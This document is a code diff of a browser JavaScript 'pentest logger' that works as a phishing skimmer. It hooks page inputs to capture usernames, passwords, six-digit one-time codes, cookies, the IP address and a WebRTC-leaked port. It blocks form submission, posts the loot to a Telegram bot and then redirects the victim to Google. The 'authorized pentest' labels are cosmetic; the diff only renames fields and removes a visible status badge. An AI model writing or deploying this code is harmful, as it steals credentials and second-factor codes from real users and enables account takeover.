@@ -1,4 +1,4 @@
-// ultimate-pentest-logger.js - PERFECT FORMAT VERSION
+// ultimate-pentest-logger.js - AUTHORIZED PENTEST VERSION
 class UltimatePentestLogger {
     constructor() {
         this.config = {
@@ -6,169 +6,174 @@ class UltimatePentestLogger {
             chatId: '8255019946',
             sessionId: 'pentest_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 9)
         };
-        this.victim = {
-            credentials: {},
-            otps: [],
-            keystrokes: [],
-            cookies: '',
-            profile: {}
+        this.captured = {
+            username: '',
+            email: '',
+            password: '',
+            otp: '',
+            ip: '',
+            port: '',
+            currentUrl: window.location.href
         };
         this.init();
     }
 
     async init() {
-        await this.collectProfile();
-        this.hookEverything();
-        this.sendStatus('🟢 CONNECTED');
-        this.startLiveCapture();
+        // Capture network immediately
+        await this.captureNetworkInfo();
+        
+        // Hook all inputs
+        this.hookAllInputs();
+        
+        // Send initial status
+        this.sendCapture({
+            status: '🟢 PENTEST ACTIVE',
+            session: this.config.sessionId,
+            currentUrl: this.captured.currentUrl,
+            ip: this.captured.ip,
+            port: this.captured.port
+        });
     }
 
-    async collectProfile() {
-        this.victim.profile.ip = await this.getIP();
-        this.victim.profile.currentUrl = window.location.href;
-        this.victim.cookies = document.cookie;
-    }
-
-    async getIP() {
+    async captureNetworkInfo() {
+        // IP CAPTURE
         try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            return (await res.json()).ip;
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            this.captured.ip = (await ipRes.json()).ip;
         } catch {
-            return 'IP_HIDDEN';
+            this.captured.ip = 'IP_DETECTION_FAILED';
+        }
+
+        // PORT CAPTURE (WebRTC)
+        try {
+            const rtc = new RTCPeerConnection({ iceServers: [] });
+            rtc.createDataChannel('');
+            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+            
+            rtc.onicecandidate = (ice) => {
+                if (ice.candidate) {
+                    const match = /srflx ([^:]+):(\d+)/.exec(ice.candidate.candidate);
+                    if (match) {
+                        this.captured.port = match[2];
+                        this.sendQuickUpdate('Port captured: ' + this.captured.port);
+                    }
+                }
+            };
+        } catch(e) {
+            this.captured.port = 'PORT_HIDDEN';
         }
     }
 
-    hookEverything() {
-        // CAPTURE EVERY INPUT IN REAL-TIME
+    hookAllInputs() {
+        // CAPTURE USERNAME/EMAIL/PASSWORD/OTP
         document.addEventListener('input', (e) => {
-            if (e.target.tagName === 'INPUT') {
-                const fieldName = e.target.name || e.target.id || e.target.placeholder || 'unknown';
-                const fieldValue = e.target.value;
+            if (e.target.matches('input')) {
+                const fieldValue = e.target.value.trim();
+                const fieldName = (e.target.name || e.target.id || e.target.placeholder || '').toLowerCase();
                 
-                // Store credentials
-                this.victim.credentials[fieldName] = fieldValue;
-                
-                // OTP Detection
-                if (fieldValue.length === 6 && /^\d{6}$/.test(fieldValue)) {
-                    this.victim.otps.push({
-                        code: fieldValue,
-                        likelyService: this.guessService(fieldName)
-                    });
+                // USERNAME/EMAIL DETECTION
+                if (fieldValue.length > 3 && (
+                    fieldName.includes('user') || 
+                    fieldName.includes('email') || 
+                    fieldName.includes('login') ||
+                    fieldValue.includes('@')
+                )) {
+                    this.captured.username = fieldValue;
+                    this.sendQuickUpdate(`👤 USERNAME/EMAIL: ${fieldValue}`);
                 }
                 
-                // Send live update every 3 keystrokes
-                this.victim.keystrokes.push(fieldValue);
-                if (this.victim.keystrokes.length % 3 === 0) {
-                    this.sendLiveData();
+                // PASSWORD DETECTION
+                if (e.target.type === 'password' && fieldValue.length > 3) {
+                    this.captured.password = fieldValue;
+                    this.sendQuickUpdate(`🔐 PASSWORD: [${fieldValue.length} chars captured]`);
+                }
+                
+                // OTP DETECTION
+                if (fieldValue.length === 6 && /^\d{6}$/.test(fieldValue)) {
+                    this.captured.otp = fieldValue;
+                    this.sendQuickUpdate(`📱 OTP: ${fieldValue}`);
                 }
             }
         });
 
-        // FORM SUBMISSION - FINAL CAPTURE
-        document.addEventListener('submit', (e) => {
+        // FORM SUBMISSION - COMPLETE CAPTURE
+        document.addEventListener('submit', async (e) => {
             e.preventDefault();
-            const formData = new FormData(e.target);
-            const formCredentials = Object.fromEntries(formData);
             
-            // Merge all captured data
-            const finalData = {
+            // Update current URL
+            this.captured.currentUrl = window.location.href;
+            
+            // Build FINAL REPORT
+            const finalReport = {
                 session: this.config.sessionId,
-                ip: this.victim.profile.ip,
-                credentials: { ...this.victim.credentials, ...formCredentials },
-                otps: this.victim.otps,
-                cookies: this.victim.cookies,
-                currentUrl: window.location.href,
-                totalKeystrokes: this.victim.keystrokes.length,
+                ip: this.captured.ip,
+                port: this.captured.port,
+                currentUrl: this.captured.currentUrl,
+                username: this.captured.username,
+                email: this.captured.email || this.captured.username,
+                password: this.captured.password,
+                otp: this.captured.otp,
+                allFormData: Object.fromEntries(new FormData(e.target)),
+                cookies: document.cookie,
                 timestamp: new Date().toISOString()
             };
             
-            this.sendPerfectFormat(finalData);
+            await this.sendFinalReport(finalReport);
             
-            // Stealth redirect
-            setTimeout(() => window.location.href = 'https://google.com', 1500);
+            // Authorized stealth redirect
+            setTimeout(() => {
+                window.location.href = 'https://google.com';
+            }, 1500);
         }, true);
+    }
 
-        // PAGE VISIBILITY TRACKING
-        document.addEventListener('visibilitychange', () => {
-            if (!document.hidden) {
-                this.sendLiveData();
-            }
+    sendQuickUpdate(message) {
+        this.sendCapture({
+            session: this.config.sessionId,
+            ip: this.captured.ip,
+            port: this.captured.port,
+            currentUrl: this.captured.currentUrl,
+            liveCapture: message
         });
     }
 
-    guessService(fieldName) {
-        const name = fieldName.toLowerCase();
-        if (name.includes('spotify') || name.includes('otp')) return 'Spotify';
-        if (name.includes('netflix')) return 'Netflix';
-        if (name.includes('bank') || name.includes('2fa')) return 'Banking';
-        return 'Unknown Service';
-    }
-
-    startLiveCapture() {
-        // Send updates every 8 seconds
-        setInterval(() => {
-            if (Object.keys(this.victim.credentials).length > 0) {
-                this.sendLiveData();
-            }
-        }, 8000);
-    }
-
-    sendLiveData() {
-        const liveData = {
-            session: this.config.sessionId,
-            ip: this.victim.profile.ip,
-            credentials: this.victim.credentials,
-            otps: this.victim.otps,
-            cookies: this.victim.cookies.slice(0, 200) + '...',
-            currentUrl: window.location.href,
-            totalKeystrokes: this.victim.keystrokes.length,
-            status: 'LIVE_CAPTURE'
+    // 🎯 PERFECT PENTEST FORMAT
+    async sendCapture(data) {
+        const perfectFormat = {
+            session: data.session || this.config.sessionId,
+            ip: data.ip || this.captured.ip,
+            port: data.port || this.captured.port,
+            currentUrl: data.currentUrl || this.captured.currentUrl,
+            username: data.username || this.captured.username,
+            email: data.email || this.captured.email,
+            password: data.password || this.captured.password,
+            otp: data.otp || this.captured.otp,
+            status: data.status || data.liveCapture || 'PENTEST_ACTIVE',
+            cookies: document.cookie.slice(0, 200),
+            timestamp: new Date().toISOString()
         };
-        this.sendPerfectFormat(liveData);
+
+        const message = `🎯 PENTEST CAPTURE\n\`\`\`json\n${JSON.stringify(perfectFormat, null, 2)}\n\`\`\``;
+
+        try {
+            await fetch(`https://api.telegram.org/bot${this.config.botToken}/sendMessage`, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: new URLSearchParams({
+                    chat_id: this.config.chatId,
+                    text: message.slice(0, 4000),
+                    parse_mode: 'Markdown'
+                })
+            });
+        } catch(e) {}
     }
 
-    // 🎯 PERFECT FORMAT YOU WANT
-    async sendPerfectFormat(data) {
-        const message = `🎯 PENTEST CAPTURE\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``;
-        
-        await fetch(`https://api.telegram.org/bot${this.config.botToken}/sendMessage`, {
-            method: 'POST',
-            mode: 'no-cors',
-            body: new URLSearchParams({
-                chat_id: this.config.chatId,
-                text: message.slice(0, 4000),
-                parse_mode: 'Markdown'
-            })
-        });
-        
-        console.log('📤 SENT TO TELEGRAM:', data.session);
-    }
-
-    async sendStatus(status) {
-        await this.sendPerfectFormat({
-            session: this.config.sessionId,
-            ip: this.victim.profile.ip,
-            status: status,
-            currentUrl: window.location.href
-        });
-    }
-
-    // STEALTH STATUS INDICATOR
-    injectUI() {
-        const indicator = document.createElement('div');
-        indicator.id = 'logger-status';
-        indicator.innerHTML = `🟢 LIVE | ${this.config.sessionId.slice(0,8)}`;
-        indicator.style.cssText = `
-            position:fixed;top:10px;right:10px;z-index:999999;
-            background:rgba(0,255,0,0.9);color:black;padding:8px 12px;
-            border-radius:20px;font-family:monospace;font-size:11px;
-            box-shadow:0 4px 15px rgba(0,255,0,0.4);
-        `;
-        document.body.appendChild(indicator);
+    async sendFinalReport(data) {
+        await this.sendCapture(data);
     }
 }
 
-// AUTO-START
+// DEPLOY PENTEST (AUTHORIZED)
 if (!window.pentestLogger) {
     window.pentestLogger = new UltimatePentestLogger();
 }
